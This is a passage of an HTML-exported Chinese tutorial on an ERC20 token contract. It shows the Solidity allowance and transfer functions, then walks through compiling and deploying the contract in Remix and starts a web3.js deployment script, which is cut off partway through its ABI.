class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @param _spender The address which will spend the funds.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @param _value The amount of tokens to be spent.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">approve</span>(<span class="cm-def">address</span> <span class="cm-variable">_spender</span>, <span class="cm-variable">uint256</span> <span class="cm-variable">_value</span>) <span class="cm-variable">public</span> <span class="cm-variable">returns</span> (<span class="cm-variable">bool</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">allowed</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>][<span class="cm-variable">_spender</span>] <span class="cm-operator">=</span> <span class="cm-variable">_value</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">emit</span> <span class="cm-variable">Approval</span>(<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>, <span class="cm-variable">_spender</span>, <span class="cm-variable">_value</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-atom">true</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @dev Transfer tokens from one address to another</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @param _from address The address which you want to send tokens from</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @param _to address The address which you want to transfer to</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @param _value uint256 the amount of tokens to be transferred</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">transferFrom</span>(<span class="cm-def">address</span> <span class="cm-variable">_from</span>, <span class="cm-variable-2">address</span> <span class="cm-variable">_to</span>, <span class="cm-variable">uint256</span> <span class="cm-variable">_value</span>) <span class="cm-variable">public</span> <span class="cm-variable">returns</span> (<span class="cm-variable">bool</span>)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">require</span>(<span class="cm-variable">_value</span> <span class="cm-operator">&lt;=</span> <span class="cm-variable">balances</span>[<span class="cm-variable">_from</span>], <span class="cm-string">"from's balance is unsufficient."</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">require</span>(<span class="cm-variable">_value</span> <span class="cm-operator">&lt;=</span> <span class="cm-variable">allowed</span>[<span class="cm-variable">_from</span>][<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>], <span class="cm-string">"value to be transfered is unapproved"</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">require</span>(<span class="cm-variable">_to</span> <span class="cm-operator">!=</span> <span class="cm-variable">address</span>(<span class="cm-number">0</span>), <span class="cm-string">"to's address is invalid"</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">balances</span>[<span class="cm-variable">_from</span>] <span class="cm-operator">=</span> <span class="cm-variable">balances</span>[<span class="cm-variable">_from</span>].<span class="cm-property">sub</span>(<span class="cm-variable">_value</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">balances</span>[<span class="cm-variable">_to</span>] <span class="cm-operator">=</span> <span class="cm-variable">balances</span>[<span class="cm-variable">_to</span>].<span class="cm-property">add</span>(<span class="cm-variable">_value</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">allowed</span>[<span class="cm-variable">_from</span>][<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>] <span class="cm-operator">=</span> <span class="cm-variable">allowed</span>[<span class="cm-variable">_from</span>][<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>].<span class="cm-property">sub</span>(<span class="cm-variable">_value</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">emit</span> <span class="cm-variable">Transfer</span>(<span class="cm-variable">_from</span>, <span class="cm-variable">_to</span>, <span class="cm-variable">_value</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-atom">true</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @dev Increase the amount of tokens that an owner allowed to a spender.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * approve should be called when allowed[_spender] == 0. To increment</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * allowed value is better to use this function to avoid 2 calls (and wait until</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * the first transaction is mined)</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * From MonolithDAO Token.sol</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @param _spender The address which will spend the funds.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @param _addedValue The amount of tokens to increase the allowance by.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">increaseApproval</span>(<span class="cm-def">address</span> <span class="cm-variable">_spender</span>, <span class="cm-variable">uint256</span> <span class="cm-variable">_addedValue</span>) <span class="cm-variable">public</span> <span class="cm-variable">returns</span> (<span class="cm-variable">bool</span>)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">allowed</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>][<span class="cm-variable">_spender</span>] <span class="cm-operator">=</span> (<span class="cm-variable">allowed</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>][<span class="cm-variable">_spender</span>].<span class="cm-property">add</span>(<span class="cm-variable">_addedValue</span>));</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">emit</span> <span class="cm-variable">Approval</span>(<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>, <span class="cm-variable">_spender</span>, <span class="cm-variable">allowed</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>][<span class="cm-variable">_spender</span>]);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-atom">true</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @dev Decrease the amount of tokens that an owner allowed to a spender.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * approve should be called when allowed[_spender] == 0. To decrement</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * allowed value is better to use this function to avoid 2 calls (and wait until</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * the first transaction is mined)</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * From MonolithDAO Token.sol</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @param _spender The address which will spend the funds.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @param _subtractedValue The amount of tokens to decrease the allowance by.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">decreaseApproval</span>(<span class="cm-def">address</span> <span class="cm-variable">_spender</span>,<span class="cm-variable">uint256</span> <span class="cm-variable">_subtractedValue</span>) <span class="cm-variable">public</span> <span class="cm-variable">returns</span> (<span class="cm-variable">bool</span>)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">uint256</span> <span class="cm-variable">oldValue</span> <span class="cm-operator">=</span> <span class="cm-variable">allowed</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>][<span class="cm-variable">_spender</span>];</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-variable">_subtractedValue</span> <span class="cm-operator">&gt;=</span> <span class="cm-variable">oldValue</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">allowed</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>][<span class="cm-variable">_spender</span>] <span class="cm-operator">=</span> <span class="cm-number">0</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  } <span class="cm-keyword">else</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">allowed</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>][<span class="cm-variable">_spender</span>] <span class="cm-operator">=</span> <span class="cm-variable">oldValue</span>.<span class="cm-property">sub</span>(<span class="cm-variable">_subtractedValue</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">emit</span> <span class="cm-variable">Approval</span>(<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>, <span class="cm-variable">_spender</span>, <span class="cm-variable">allowed</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>][<span class="cm-variable">_spender</span>]);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-atom">true</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 5068px;"></div><div class="CodeMirror-gutters" style="display: none; height: 5068px;"></div></div></div></pre><h4><a name='header-n353' class='md-header-anchor '></a>在线编译</h4><p>在 <code>https://remix.ethereum.org</code> 新建文件 <code>erc20_token.sol</code>，粘贴上述代码，点击编译，生成结果如下</p><p><img src='pic/blockchain/compile_erc20_token.png' alt='' referrerPolicy='no-referrer' /></p><h4><a name='header-n358' class='md-header-anchor '></a>部署合约</h4><p>点击右侧运行，选择 <code>Standard Token</code></p><p><img src='pic/blockchain/choose_standard_token.png' alt='' referrerPolicy='no-referrer' /></p><p>输入合约的构造函数的参数，分别为 <code>12306，“Kevin&#39;s Token&quot;, 18, &quot;KT&quot;</code>，然后点击 <code>Deploy</code></p><p><img src='pic/blockchain/deploy_standard_token.png' alt='' referrerPolicy='no-referrer' /></p><p>查看页面下方的控制台，查看详情，找到合约地址 <code>0xef55bfac4228981e850936aaf042951f7b146e41</code></p><p><img src='pic/blockchain/deploy_standard_token2.png' alt='' referrerPolicy='no-referrer' /></p><h4><a name='header-n371' class='md-header-anchor '></a>执行合约</h4><p>复制合约地址，点击 <code>At Address</code></p><p><img src='pic/blockchain/run_standard_token.png' alt='' referrerPolicy='no-referrer' /></p><p>执行合约的 <code>totalSupply</code> 函数</p><p><img src='pic/blockchain/run_standard_token2.png' alt='' referrerPolicy='no-referrer' /></p><p>点击控制台，展开交易详情，如下所示</p><p><img src='pic/blockchain/run_standard_token3.png' alt='' referrerPolicy='no-referrer' /></p><h4><a name='header-n384' class='md-header-anchor '></a>在测试网络部署合约</h4><p>在 <code>https://remix.ethereum.org</code> 编译合约之后，点击 <code>Detail</code>，找到 <code>WEB3DEPLOY</code></p><p><img src='pic/blockchain/standard_token_web3_deploy.png' alt='' referrerPolicy='no-referrer' /></p><p><img src='pic/blockchain/standard_token_web3_deploy2.png' alt='' referrerPolicy='no-referrer' /></p><p>对 js 略作修改，赋初值，保存脚本为 <code>erc20.js</code></p><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="javascript" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">let</span> <span class="cm-def">Web3</span> <span class="cm-operator">=</span> <span class="cm-variable">require</span>(<span class="cm-string">'web3'</span>);</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">let</span> <span class="cm-def">web3</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">if</span> (<span class="cm-keyword">typeof</span> <span class="cm-variable">web3</span> <span class="cm-operator">!==</span> <span class="cm-string">'undefined'</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">web3</span> <span class="cm-operator">=</span> <span class="cm-keyword">new</span> <span class="cm-variable">Web3</span>(<span class="cm-variable">web3</span>.<span class="cm-property">currentProvider</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">} <span class="cm-keyword">else</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// set the provider you want from Web3.providers</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">web3</span> <span class="cm-operator">=</span> <span class="cm-keyword">new</span> <span class="cm-variable">Web3</span>(<span class="cm-keyword">new</span> <span class="cm-variable">Web3</span>.<span class="cm-property">providers</span>.<span class="cm-property">HttpProvider</span>(<span class="cm-string">"http://localhost:8545"</span>));</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">_initialSupply</span> <span class="cm-operator">=</span> <span class="cm-number">12306</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">_tokenName</span> <span class="cm-operator">=</span> <span class="cm-string">"Hello World Token"</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">_decimalUnits</span> <span class="cm-operator">=</span> <span class="cm-number">18</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">_tokenSymbol</span> <span class="cm-operator">=</span> <span class="cm-string">"HWT"</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">var</span> <span class="cm-def">standardtokenContract</span> <span class="cm-operator">=</span> <span class="cm-variable">web3</span>.<span class="cm-property">eth</span>.<span class="cm-property">contract</span>([{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"inputs"</span>:[],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"name"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"string"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_spender"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_value"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"approve"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"bool"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"nonpayable"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"inputs"</span>:[],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"totalSupply"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_from"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_to"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_value"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"transferFrom"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"bool"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"nonpayable"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"inputs"</span>:[],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"decimals"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint8"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_spender"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_subtractedValue"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"decreaseApproval"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"bool"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"nonpayable"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_owner"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"balanceOf"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"inputs"</span>:[],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"owner"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">true</span>,<span class="cm-string cm-property">"inputs"</span>:[],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"symbol"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"string"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_to"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_value"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"transfer"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"bool"</span>}],<span class="cm-string cm-property">"payable"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"stateMutability"</span>:<span class="cm-string">"nonpayable"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string cm-property">"constant"</span>:<span class="cm-atom">false</span>,<span class="cm-string cm-property">"inputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_spender"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"address"</span>},{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"_addedValue"</span>,<span class="cm-string cm-property">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string cm-property">"name"</span>:<span class="cm-string">"increaseApproval"</span>,<span class="cm-string cm-property">"outputs"</span>:[{<span class="cm-string cm-property">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string cm-property">"type"</span>:<span 